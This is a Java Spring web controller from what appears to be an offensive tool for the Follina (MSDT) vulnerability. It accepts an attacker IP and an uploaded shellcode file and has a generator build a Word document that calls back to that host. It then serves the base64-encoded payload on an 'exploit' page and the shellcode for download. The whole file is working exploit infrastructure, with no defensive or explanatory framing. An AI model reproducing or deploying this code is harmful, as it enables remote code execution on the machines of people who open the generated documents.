package com.follina.anunnaki;

import java.io.IOException;

import javax.servlet.http.HttpServletResponse;

import org.springframework.core.io.ByteArrayResource;
import org.springframework.core.io.Resource;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.servlet.ModelAndView;

@Controller
public class WebController {

	private final static String RANDOM_ATTRIBUT = "random";
	private final static String PAYLOAD_ATTRIBUT = "payload";

	// Controller running
	private boolean running = false;
	private String payloadBase64;
	private String random;
	private Configuration configuration;

	// JSP - Pages
	private final static String HOME_PAGE = "index";
	private final static String PAYLOAD_PAGE = "exploit";
	private final static String REDIRECTION = "redirect:/anunnaki";
	private final static String STOP_SERVER_JSP = "stopserver";

	@GetMapping("/anunnaki")
	public ModelAndView getPage() {
		if (!running) {
			return new ModelAndView(HOME_PAGE);
		} else {
			return new ModelAndView(STOP_SERVER_JSP);
		}

	}

	@PostMapping("/anunnaki")
	public ModelAndView postAttribut(@RequestParam(name = "stop", required = false) String stop,
			@RequestParam(name = "ip", required = false) String ip,
			@RequestParam(name = "shellcode", required = false) MultipartFile file) throws IOException { // TODO
		ModelAndView model = new ModelAndView(REDIRECTION);
		if (stop != null) {
			if (running) {
				running = false;
				payloadBase64 = "";
				random = "";
				configuration = null;
				FollinaGenerater.clean();
			}
		} else {
			// Recover Configuration
			Configuration configuration = new Configuration();
			configuration.configureFile(file);
			configuration.setIp(ip);
			this.configuration = configuration;
			// Generate word Document
			FollinaGenerater generater = new FollinaGenerater(
					"http://" + configuration.getIp() + ":5656/anunnaki/loadpayload");
			Thread thread = new Thread(generater);
			thread.start();
			// Generate payload
			random = Utils.generateRandom();
			payloadBase64 = Utils.generatePayload(configuration);
			// Starting process
			running = true;
		}
		return model;
	}

	@GetMapping("/anunnaki/loadpayload")
	public ModelAndView exploitMSDT(HttpServletResponse responseObject) {
		ModelAndView model = new ModelAndView(PAYLOAD_PAGE);
		model.addObject(RANDOM_ATTRIBUT, random);
		model.addObject(PAYLOAD_ATTRIBUT, payloadBase64);
		return model;
	}

	@GetMapping("/anunnaki/download")
	@ResponseBody
	public ResponseEntity<Resource> getPayload() {
		Resource resource = new ByteArrayResource(configuration.getFile());
		return ResponseEntity.ok(resource);
	}
}
